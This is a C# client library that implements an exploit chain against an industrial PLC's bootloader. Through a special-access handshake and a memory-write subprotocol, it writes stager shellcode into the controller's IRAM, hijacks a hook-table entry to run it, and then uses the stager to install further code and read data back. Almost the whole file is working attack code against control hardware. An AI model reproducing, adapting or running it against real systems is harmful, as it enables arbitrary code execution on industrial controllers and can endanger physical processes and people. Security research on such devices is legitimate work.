using System;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Linq;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace S7.Net
{
    public class PlcClient
    {
        private TcpClient? _client;
        private PlcProtocol? _protocol;
        private readonly Action<string> _log;

        public PlcClient(Action<string> logger)
        {
            _log = logger;
        }

        public bool IsConnected => _client?.Connected ?? false;

        public async Task ConnectAsync(string host, int port)
        {
            if (IsConnected) Disconnect();

            _client = new TcpClient();
            _log($"Connecting to {host}:{port}...");
            try
            {
                await _client.ConnectAsync(host, port);
                var stream = _client.GetStream();
                _protocol = new PlcProtocol(stream, _log);
                _log("Successfully connected to PLC proxy.");
            }
            catch (Exception ex)
            {
                _log($"Error connecting to PLC proxy: {ex.Message}");
                _client = null;
            }
        }

        public void Disconnect()
        {
            _client?.Close();
            _client = null;
            _log("Disconnected from PLC proxy.");
        }

        public async Task<byte[]?> InvokePrimaryHandler(byte handlerIndex, byte[] args, bool awaitResponse = true)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var payload = new byte[1 + args.Length];
            payload[0] = handlerIndex;
            Array.Copy(args, 0, payload, 1, args.Length);
            await _protocol.SendPacketAsync(payload);
            return awaitResponse ? await _protocol.ReceivePacketAsync() : null;
        }

        #region Stager/Exploit Chain
        public async Task<bool> PerformHandshakeAsync()
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log("Starting handshake...");
            byte[] magic = Encoding.ASCII.GetBytes("MFGT1");
            byte[] padding = Encoding.ASCII.GetBytes("AAAA");
            var handshakePayload = padding.Concat(magic).ToArray();

            var sw = Stopwatch.StartNew();
            while (sw.ElapsedMilliseconds < 500) // Try for 0.5 seconds
            {
                await _protocol.RawWriteAsync(handshakePayload, 0, handshakePayload.Length);
                await Task.Delay(50);
                if (_protocol.DataAvailable)
                {
                    var buffer = new byte[256];
                    int bytesRead = await _protocol.RawReadAsync(buffer, 0, buffer.Length);
                    // Expected response is \x05-CPU
                    if (bytesRead >= 5 && buffer[0] == 5 && Encoding.ASCII.GetString(buffer, 1, 4) == "-CPU")
                    {
                        _log("Handshake successful, got special access greeting.");
                        return true;
                    }
                }
            }
            _log("Handshake failed.");
            return false;
        }

        public async Task<string> GetVersion()
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log("Getting bootloader version...");
            var response = await InvokePrimaryHandler(0, Array.Empty<byte>());
            if (response is null) throw new Exception("Failed to get version.");
            string version = $"v{response[2]}.{response[3]}.{response[4]}";
            _log($"Got version: {version}");
            return version;
        }

        private async Task EnterSubprotocol(int mode)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log($"Entering subprotocol mode {mode}...");
            ushort magic = PlcConstants.SUBPROT_80_MODE_MAGICS[mode];
            byte[] payload = BitConverter.GetBytes(magic);
            if (BitConverter.IsLittleEndian) Array.Reverse(payload); // Make big-endian
            var response = await InvokePrimaryHandler(0x80, payload);
            if (response == null || !response.SequenceEqual(PlcConstants.ANSW_ENTER_SUBPROTO_SUCCESS))
                throw new Exception("Failed to enter subprotocol.");
            _log("Entered subprotocol successfully.");
        }

        private async Task LeaveSubprotocol()
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log("Leaving subprotocol...");
            await _protocol.SendPacketAsync(new byte[] { 0x81, 0xD0, 0x67 });
            await _protocol.ReceivePacketAsync();
        }

        private async Task RawSubprotocolWrite(uint address, byte[] data)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var payload = new byte[7 + data.Length];
            payload[0] = 0x84;
            payload[1] = 0x5a;
            payload[2] = 0x2e;
            var addrBytes = BitConverter.GetBytes(address);
            if (BitConverter.IsLittleEndian) Array.Reverse(addrBytes); // Ensure big-endian
            Array.Copy(addrBytes, 0, payload, 3, 4);
            Array.Copy(data, 0, payload, 7, data.Length);

            await _protocol.SendPacketAsync(payload);
            await _protocol.ReceivePacketAsync();
        }

        private async Task WriteChunkToIram(uint targetAddress, byte[] contents)
        {
            uint targetArgument = targetAddress - 0x10000000;
            // 1. Mask with 0xFF bytes
            await RawSubprotocolWrite(targetArgument, Enumerable.Repeat((byte)0xFF, contents.Length).ToArray());
            // 2. Write actual contents
            await RawSubprotocolWrite(targetArgument, contents);
        }

        public async Task WriteToIram(uint targetAddress, byte[] contents)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log($"Writing {contents.Length} bytes to IRAM at 0x{targetAddress:X8}");
            await EnterSubprotocol(PlcConstants.SUBPROT_80_MODE_IRAM);

            int chunkSize = 16; // From python script
            for (int i = 0; i < contents.Length; i += chunkSize)
            {
                int size = Math.Min(chunkSize, contents.Length - i);
                var chunk = new byte[size];
                Array.Copy(contents, i, chunk, 0, size);
                _log($"Writing chunk {i / chunkSize + 1}...");
                await WriteChunkToIram(targetAddress + (uint)i, chunk);
            }

            await LeaveSubprotocol();
            _log("Finished writing to IRAM.");
        }

        public async Task InstallStager(byte[] stagerPayload)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log("Starting stager installation...");
            // 1. Write stager shellcode to its location in IRAM
            await WriteToIram(PlcConstants.IRAM_STAGER_START, stagerPayload);

            // 2. Overwrite an entry in the hook table to point to our stager
            _log("Overwriting hook table entry...");
            var hookEntryPayload = new byte[6];
            hookEntryPayload[0] = 0x00; // Arg length check part 1
            hookEntryPayload[1] = 0xFF; // Arg length check part 2 (0x00FF = variable length)

            // Pointer to the stager code (big-endian)
            var addrBytes = BitConverter.GetBytes(PlcConstants.IRAM_STAGER_START);
            if (BitConverter.IsLittleEndian) Array.Reverse(addrBytes);
            Array.Copy(addrBytes, 0, hookEntryPayload, 2, 4);

            await WriteToIram(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
            _log("Stager installation complete.");
        }
        #endregion

        #region Stager Communication
        private byte[] EncodePacketForStager(byte[] chunk)
        {
            for (int i = 1; i < 256; i++)
            {
                byte key = (byte)i;
                bool keyInChunk = chunk.Contains(key);
                bool keyIsLength = (key == chunk.Length + 2);
                if (!keyInChunk && !keyIsLength)
                {
                    var encoded = new byte[chunk.Length + 1];
                    encoded[0] = key;
                    for (int j = 0; j < chunk.Length; j++)
                    {
                        encoded[j + 1] = (byte)(chunk[j] ^ key);
                    }
                    return encoded;
                }
            }
            throw new Exception("Could not find a suitable XOR key to encode chunk.");
        }

        public async Task SendFullMsgViaStager(byte[] msg)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            int maxChunkSize = PlcConstants.MAX_MSG_LEN - 1;
            for (int i = 0; i < msg.Length; i += maxChunkSize)
            {
                int size = Math.Min(maxChunkSize, msg.Length - i);
                var chunk = new byte[size];
                Array.Copy(msg, i, chunk, 0, size);

                _log($"Stager send progress: {i}/{msg.Length}");

                var encoded = EncodePacketForStager(chunk);
                await _protocol.SendPacketAsync(encoded, 8, 10);

                var ack = await _protocol.ReceivePacketAsync();
                if (ack == null || ack.Length != 1)
                {
                    throw new Exception("Did not receive expected empty ACK from stager.");
                }
            }
            // Send empty packet to signify end of transmission
            await _protocol.SendPacketAsync(EncodePacketForStager(Array.Empty<byte>()));
            await _protocol.ReceivePacketAsync();
        }

        public async Task<byte[]?> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            if (hookNo < 0 || hookNo > 0x20)
                throw new ArgumentOutOfRangeException(nameof(hookNo));

            var payload = new byte[1 + args.Length];
            payload[0] = (byte)hookNo;
            Array.Copy(args, 0, payload, 1, args.Length);

            return await InvokePrimaryHandler(0x1c, payload, awaitResponse);
        }

        public async Task WriteViaStager(uint address, byte[] contents)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var addressBytes = new byte[]
            {
                (byte)(address >> 24),
                (byte)(address >> 16),
                (byte)(address >> 8),
                (byte)address
            };
            await InvokeAddHook(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false);
            await SendFullMsgViaStager(contents);
        }

        public async Task InstallAddHookViaStager(uint targetAddress, byte[] payload, int newHookNo)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            // Set up function pointer and disable arbitrary argument length check
            var hookEntry = new byte[8];
            hookEntry[3] = 0xff; // Variable length
            hookEntry[4] = (byte)(targetAddress >> 24);
            hookEntry[5] = (byte)(targetAddress >> 16);
            hookEntry[6] = (byte)(targetAddress >> 8);
            hookEntry[7] = (byte)targetAddress;
            await WriteViaStager(PlcConstants.ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry);

            // Write the code of the handler itself
            await WriteViaStager(targetAddress, payload);
        }

        public async Task<byte[]> ReceiveMany(IProgress<long> progress, int timeoutMs = 5000)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            using (var ms = new MemoryStream())
            {
                while (true)
                {
                    var chunk = await _protocol.ReceivePacketAsync(timeoutMs);
                    if (chunk == null || chunk.Length == 0)
                    {
                        break;
                    }
                    await ms.WriteAsync(chunk, 0, chunk.Length);
                    progress?.Report(ms.Length);
                }
                return ms.ToArray();
            }
        }
        #endregion
    }
}
